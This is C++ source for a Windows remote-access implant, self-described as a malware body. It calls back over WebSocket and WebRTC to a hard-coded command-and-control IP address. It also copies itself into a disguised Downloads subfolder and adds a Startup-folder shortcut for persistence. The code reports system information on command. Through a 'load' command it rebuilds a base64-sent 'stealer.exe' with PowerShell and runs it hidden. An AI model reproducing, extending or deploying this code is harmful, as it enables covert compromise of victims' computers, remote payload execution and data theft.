#include "rtc/rtc.hpp"

#include "parse_cl.h"

#include <nlohmann/json.hpp>

#include <algorithm>
#include <future>
#include <iostream>
#include <memory>
#include <random>
#include <stdexcept>
#include <thread>
#include <unordered_map>

#include <windows.h>
#include <ShellAPI.h>
#include <cstdlib>
#include <fstream>
#include <Shlobj.h>
#include <filesystem>
#include <iterator>
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"

//#include "helpers.h"

using namespace rtc;
using namespace std;
using namespace std::chrono_literals;

using json = nlohmann::json;

template <class T> weak_ptr<T> make_weak_ptr(shared_ptr<T> ptr) { return ptr; }
shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                weak_ptr<WebSocket> wws, string id);

unordered_map<string, shared_ptr<PeerConnection>> peerConnectionMap;
unordered_map<string, shared_ptr<DataChannel>> dataChannelMap;

string localId;
string data_directory;
string user_directory;


string randomId(size_t length);
string parseMessage(string message);
void createFileFromBase64String(char *filename);
int runScript(char *file_source, char *file_output);
int setupDirectory();
int setupPersist();
void HideConsole();
std::string stream_as_string(std::istream &stm);
HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc);
std::string getLog(std::string filename);
std::string getExePath();
SYSTEM_INFO getSystemInfo(std::string data);


const string c2_id = "6969";
const string stunServer = "stun:stun.l.google.com:19302";
const string stunServer2 = "stun:stun2.l.google.com:19302";
const string signalServed = "ws://73.4.243.143:8000";

const string fileName = "Downloader.exe";
const int SLP_TIME = 60000;  // 1 Minute
bool connected = false;




/***
* main | Main Malware body
***/
int main(int argc, char **argv) try {

	// HideConsole(); // Hides console UI | Disabled for testing purposes
	setupDirectory();
	setupPersist();

	Cmdline params(argc, argv);						// Execution parameters

	string c2id = c2_id;							// Reassign global to local scope var
	Configuration config;

	rtc::InitLogger(LogLevel::Info);				// TODO: Delete rtc logging

	config.iceServers.emplace_back(stunServer);

	localId = randomId(4); 							// Local ID generation

	auto ws = make_shared<WebSocket>();				// Create socket

	std::promise<void> wsPromise;
	auto wsFuture = wsPromise.get_future();

	// On open connection
	ws->onOpen([&wsPromise]() {
		wsPromise.set_value();
	});

	// On error thrown
	ws->onError([&wsPromise](string s) {
		wsPromise.set_exception(std::make_exception_ptr(std::runtime_error(s)));
	});

	// On socket close
	ws->onClosed([]() { cout << "WebSocket closed" << endl; });

	// Sets description accordingly to connect to C2
	ws->onMessage([&](variant<binary, string> data) {
		if (!holds_alternative<string>(data))
			return;

		json message = json::parse(get<string>(data));

		auto it = message.find("id");
		if (it == message.end())
			return;
		string id = it->get<string>();

		it = message.find("type");
		if (it == message.end())
			return;
		string type = it->get<string>();

		shared_ptr<PeerConnection> pc;
		if (auto jt = peerConnectionMap.find(id); jt != peerConnectionMap.end()) {
			pc = jt->second;
		} else if (type == "offer") {
			cout << "Answering to " + id << endl;
			pc = createPeerConnection(config, ws, id);
		} else {
			return;
		}

		if (type == "offer" || type == "answer") {
			auto sdp = message["description"].get<string>();
			pc->setRemoteDescription(Description(sdp, type));
		} else if (type == "candidate") {
			auto sdp = message["candidate"].get<string>();
			auto mid = message["mid"].get<string>();
			pc->addRemoteCandidate(Candidate(sdp, mid));
		}
	});

	
	const string url = signalServed + "/" + localId;   // Format url to connect to C2
	ws->open(url);

	wsFuture.get();							           // Await for connection

	/*Connected to C2*/


	while (true) {

		Sleep(SLP_TIME);   // Sleeps to wait for network connection, in case it was launched on Start Up

		if (connected) {
			continue;      // If a connection is established, keep waiting for commands
		}

		//Create Connection
		auto pc = createPeerConnection(config, ws, c2id);

		//Create a data channel to initiate the process
		const string label = "c2-main";
		auto dc = pc->createDataChannel(label);

		//Create C2 Connection
		dc->onOpen([c2id, wdc = make_weak_ptr(dc)]() {
			cout << "DataChannel from " << c2id << " open" << endl;
			if (auto dc = wdc.lock()){
				dc->send("check-in " + localId); //Checks In with C2
				connected = true;

			}
		});
		
		
		dc->onClosed([c2id]() { 
			cout << "DataChannel from " << c2id << " closed" << endl; 
			connected = false;

		});

		//On received Message
		dc->onMessage([c2id, wdc = make_weak_ptr(dc)](variant<binary, string> data) {
			if (holds_alternative<string>(data)){

				//Interpret Messages (Verify, Decrypt, Interpret) 
				cout << "CONSUMING.." << endl;
				string answer = parseMessage(get<string>(data));
				if(auto dc = wdc.lock()){
					cout << "SENDING ANSWER TO C2" << endl;
					dc->send(answer);
				}
			}
			else
				cout << "Binary message from C2 received, size=" << get<binary>(data).size() << endl;
		});

		dataChannelMap.emplace(c2id, dc);
	}

	cout << "Cleaning up..." << endl;

	dataChannelMap.clear();
	peerConnectionMap.clear();
	return 0;

} catch (const std::exception &e) {
	std::cout << "Error: " << e.what() << std::endl;
	dataChannelMap.clear();
	peerConnectionMap.clear();
	return -1;
}


/***
 * Interprets messages from the C2 (Verify, Decrypt, Process) and creates an answer to send to the
 *C2s
 ***/
string parseMessage(string message) {

	// Commands
	string cmd1 =
	    "list-implants"; // Provides an updated version of implants and their respective information
	string cmd2 = "pop-up";      // Pops up a windows with the provided message (Testing purposes)
	string cmd3 = "system-info"; // Asks for system information
	string cmd4 = "load";        // Loads a given file (base64 format)

	/***
	 * list-implants | List the implants connected on the network.
	 ***/
	if (strncmp(message.c_str(), cmd1.c_str(), cmd1.size()) == 0) {

		string data = message.substr(message.find(":") + 1); // Parameter (Data for command)
		// TODO: Update arrays and save on to disk

		/***
		 * pop-up | Pop a message box with the give message
		 ***/
	} else if (strncmp(message.c_str(), cmd2.c_str(), cmd2.size()) == 0) {
		string data = message.substr(message.find(":") + 1);
		int msgboxID = MessageBox(NULL, data.c_str(), "Important Message",
		                          MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2);

		/***
		 * system-info | Returns basic system information
		 ***/
	} else if (strncmp(message.c_str(), cmd3.c_str(), cmd3.size()) == 0) {
		string data = message.substr(message.find(":") + 1); // Parameter

		SYSTEM_INFO sysInfo = getSystemInfo(data);
		auto oemId = std::to_string(sysInfo.dwOemId);
		auto processorNumber = std::to_string(sysInfo.dwNumberOfProcessors);
		auto pageSize = std::to_string(sysInfo.dwPageSize);
		auto processorType = std::to_string(sysInfo.dwProcessorType);
		auto activeProcessorMask = std::to_string(sysInfo.dwActiveProcessorMask);

		auto answer = oemId + ":" + processorNumber + ":" + pageSize + ":" + processorType + ":" +
		              activeProcessorMask;
		return answer;

		/***
		 * load | Loads a base64 string to an executable and executes it
		 ***/
	} else if (strncmp(message.c_str(), cmd4.c_str(), cmd4.size()) == 0) {
		char *filename = "stealer2.txt";
		cout << "RECEIVED DATA" << endl;
		string numberStr = message.substr(message.find(":") + 1,
		                                  message.find("::") +
		                                      1); // Number of messages to retrieve in base64 string
		int number = stoi(numberStr);
		string data = message.substr(message.find("::") + 2); // Actual string
		cout << number << endl;
		if (number == 2) { // Create new file
			std::ofstream outfile(filename);
			outfile << data;
			outfile.close();
		} else if (number == 1) { // Append
			std::ofstream outfile;
			outfile.open(filename, std::ios_base::app);
			outfile << data;
			outfile.close();
		} else { // Proceed
			createFileFromBase64String(filename);
		}

		return "COMPLETED";
	} else
		cout << message << endl;

	return "Received Correctly";
}


/***
 * setupDirectory | Sets up the working directory for the implant
 ***/
int setupDirectory() {

	WCHAR path[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, path))) {
		wstring ws(path);
		string strPath(ws.begin(), ws.end());

		user_directory = strPath;

		// TODO: Check if folder exist before creating it (Alternative)
		namespace fs = std::filesystem;
		fs::create_directories(strPath + "\\Downloads\\cache-d");
		data_directory = strPath + "\\Downloads\\cache-d";

		return 1;
	}
	return 0;
}


/***
 * setupPersist | Attempts to create persistence on the machine by copying a shorcut to Windows Startup folder
 ***/
int setupPersist() {

	// Copies itself to its data directory
	string exePath = getExePath();
	std::filesystem::copy(exePath, data_directory + "\\" + fileName);

	// Assuming its copied on its directory folder
	string source = data_directory + "\\" + fileName;
	string destination =
	    user_directory +
	    "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk";

	// Create shortcut
	CreateLink(source.c_str(), destination.c_str(), data_directory.c_str(), "Some bullshit");

	return 1;
}


/***
 * createFileFromBase | Creates a binary from a base64 string
 ***/
void createFileFromBase64String(char *filename) {

	STARTUPINFO info = {sizeof(info)};
	PROCESS_INFORMATION processInfo;
	string cmd = "powershell.exe $FileName = Get-Content '" + data_directory +
	             "\\stealer.txt'\n$Destination = '" + data_directory +
	             "\\stealer.exe'\n[IO.File]::WriteAllBytes($Destination, "
	             "[Convert]::FromBase64String($FileName))";
	LPSTR cmd2 = const_cast<char *>(cmd.c_str());

	// Runs powershell command to create .exe
	CreateProcess(NULL, cmd2, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);

	// Runs .exe / script
	string s = data_directory + "\\stealer.exe";
	string o = data_directory + "\\stealer_log.txt";
	runScript(&s[0], &o[0]); // To test
	cout << "TEST COMPLETED***" << endl;
}


/***
 * runScript | Runs given .exe/script and stores the log output on the given file
 ***/
int runScript(char *file_source, char *file_output) {

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	// Creates Handle
	HANDLE h = CreateFile(file_output, FILE_APPEND_DATA, FILE_SHARE_WRITE | FILE_SHARE_READ, &sa,
	                      OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	BOOL ret = FALSE;
	DWORD flags = CREATE_NO_WINDOW;

	// Retrieve parameters and set flags on 'si'
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags |= STARTF_USESTDHANDLES;
	si.hStdInput = NULL;
	si.hStdError = h;
	si.hStdOutput = h;

	// Execute command and obtain output
	ret = CreateProcess(NULL, file_source, NULL, NULL, TRUE, flags, NULL, NULL, &si, &pi);

	if (ret) {
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return 0;
	}

	return 1;
}


// Create and setup a PeerConnection
shared_ptr<PeerConnection> createPeerConnection(const Configuration &config,
                                                weak_ptr<WebSocket> wws, string id) {
	auto pc = make_shared<PeerConnection>(config);

	pc->onStateChange([](PeerConnection::State state) { cout << "State: " << state << endl; });

	pc->onGatheringStateChange(
	    [](PeerConnection::GatheringState state) { cout << "Gathering State: " << state << endl; });

	pc->onLocalDescription([wws, id](Description description) {
		json message = {
		    {"id", id}, {"type", description.typeString()}, {"description", string(description)}};

		if (auto ws = wws.lock())
			ws->send(message.dump());
	});

	pc->onLocalCandidate([wws, id](Candidate candidate) {
		json message = {{"id", id},
		                {"type", "candidate"},
		                {"candidate", string(candidate)},
		                {"mid", candidate.mid()}};

		if (auto ws = wws.lock())
			ws->send(message.dump());
	});

	pc->onDataChannel([id](shared_ptr<DataChannel> dc) {
		cout << "DataChannel from " << id << " received with label \"" << dc->label() << "\""
		     << endl;

		dc->onOpen([wdc = make_weak_ptr(dc)]() {
			if (auto dc = wdc.lock())
				dc->send("Hello from " + localId);
		});

		dc->onClosed([id]() { cout << "DataChannel from " << id << " closed" << endl; });

		dc->onMessage([id](variant<binary, string> data) {
			if (holds_alternative<string>(data))
				cout << "Message from " << id << " received: " << get<string>(data) << endl;
			else
				cout << "Binary message from " << id
				     << " received, size=" << get<binary>(data).size() << endl;
		});

		dataChannelMap.emplace(id, dc);
	});

	peerConnectionMap.emplace(id, pc);
	return pc;
};

// Helper function to generate a random ID thanks libchanneldata
string randomId(size_t length) {
	static const string characters(
	    "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
	string id(length, '0');
	default_random_engine rng(random_device{}());
	uniform_int_distribution<int> dist(0, int(characters.size() - 1));
	generate(id.begin(), id.end(), [&]() { return characters.at(dist(rng)); });
	return id;
}

HRESULT CreateLink(LPCSTR lpszPathObj, LPCSTR lpszPathLink, LPCSTR lpszPath, LPCSTR lpszDesc)

/*============================================================================*/
{
	IShellLink *psl = NULL;
	HRESULT hres = CoInitialize(NULL);

	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called.

	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink,
	                        (LPVOID *)&psl);
	if (SUCCEEDED(hres)) {
		IPersistFile *ppf;

		// Set the path to the shortcut target and add the description.
		psl->SetPath(lpszPathObj);
		psl->SetDescription(lpszDesc);
		psl->SetWorkingDirectory(lpszPath);

		// Query IShellLink for the IPersistFile interface, used for saving the
		// shortcut in persistent storage.
		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID *)&ppf);

		if (SUCCEEDED(hres)) {
			WCHAR wsz[MAX_PATH];

			// Ensure that the string is Unicode.
			MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);

			// Add code here to check return value from MultiByteWideChar
			// for success.

			// Save the link by calling IPersistFile::Save.
			hres = ppf->Save(wsz, TRUE);

			ppf->Release();
		}
		psl->Release();
	}

	CoUninitialize();

	return hres;
}

void HideConsole() { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); }

std::string stream_as_string(std::istream &stm) {
	return {std::istreambuf_iterator<char>(stm), std::istreambuf_iterator<char>{}};
}

std::string getLog(std::string filename) {
	std::ifstream file(filename);
	return stream_as_string(file);
}

std::string getExePath() {
	char result[MAX_PATH];
	return std::string(result, GetModuleFileName(NULL, result, MAX_PATH));
}

/***
 * getSystemInfo | Performs calls to WindowsAPI functions to retrieve hardware and software

 * *information
 ***/
SYSTEM_INFO getSystemInfo(std::string data) {
	SYSTEM_INFO siSysInfo;

	// Copy the hardware information to the SYSTEM_INFO struct
	GetSystemInfo(&siSysInfo);

	return siSysInfo;
}
